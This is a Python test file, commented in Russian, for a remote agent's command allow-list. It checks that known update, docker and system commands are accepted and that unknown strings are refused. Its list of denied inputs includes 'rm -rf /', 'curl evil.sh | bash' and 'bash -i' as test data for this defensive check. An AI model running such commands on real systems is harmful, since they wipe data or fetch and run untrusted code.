#!/usr/bin/env python3
"""Тесты allow-list команд агента.

Закрывает регрессию: канал команд доверяет панели, но агент должен
исполнять только известные команды. Произвольная строка (компромисс панели
или испорченный ``last_command``) не должна выполняться.

Запуск:  python tests/test_commands.py
Выход:   0 — все проверки прошли, 1 — есть падения.
"""

import pathlib
import sys

REPO = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "agent"))

from commands import command_is_allowed  # noqa: E402
import transport  # noqa: E402

PASSED = 0
FAILED = 0


def check(ok: bool, name: str, detail: str = "") -> None:
    global PASSED, FAILED
    if ok:
        PASSED += 1
        print(f"  ok   {name}")
    else:
        FAILED += 1
        print(f"  FAIL {name}" + (f": {detail}" if detail else ""))


class _Stub(transport.TransportMixin):
    """Минимальный носитель TransportMixin для проверки execute_command."""

    def __init__(self) -> None:
        self.master_url = "https://ci.invalid"
        self.node_name = "ci-runner"
        self.headers = {}
        self._exit_after_command = False
        self._command_error = ""
        self.ran = []

    def check_agent_update(self):
        self.ran.append("check_agent_update")
        return {"ok": True, "updated": False}

    def report_agent_update(self, result):
        self.ran.append("report_agent_update")
        return True


def test_allowlist():
    allowed = [
        "check-agent-update", "check-agent-updates", "update-agent",
        "upgrade-agent", "check-updates", "install-updates",
        "install-update-batch", "install-update nginx 1.2", "sync",
        "docker-logs abc123 200", "docker restart abc", "get-process-logs 42 --limit 10",
        "kill 123", "restart 5", "reboot now", "shutdown", "firewall allow 80/tcp",
        "upnp addmap 80 10.0.0.1 80 tcp desc --udn x",
    ]
    for c in allowed:
        check(command_is_allowed(c), f"разрешена: {c!r}")

    denied = [
        "", "   ", "rm -rf /", "curl evil.sh | bash", "killer 1",
        "flexible", "update-agent-extra", "bash -i",
    ]
    for c in denied:
        check(not command_is_allowed(c), f"запрещена: {c!r}")


def test_execute_rejects_unknown():
    s = _Stub()
    ok = s.execute_command("rm -rf /")
    check(ok is False, "execute_command(rm -rf /) → False")
    check(s.ran == [], "execute_command не выполнил ничего для неизвестной команды")
    check("разрешённых" in s._command_error, "причина отказа объясняет allow-list",
          repr(s._command_error))


def test_execute_known_still_works():
    s = _Stub()
    ok = s.execute_command("check-agent-update")
    check(ok is True, "execute_command(check-agent-update) → True")
    check(s.ran == ["check_agent_update", "report_agent_update"],
          "известная команда доходит до обработчика", repr(s.ran))


if __name__ == "__main__":
    print("== allow-list ==")
    test_allowlist()
    print("== execute_command ==")
    test_execute_rejects_unknown()
    test_execute_known_still_works()
    print(f"\nПройдено: {PASSED}, провалено: {FAILED}")
    sys.exit(1 if FAILED else 0)
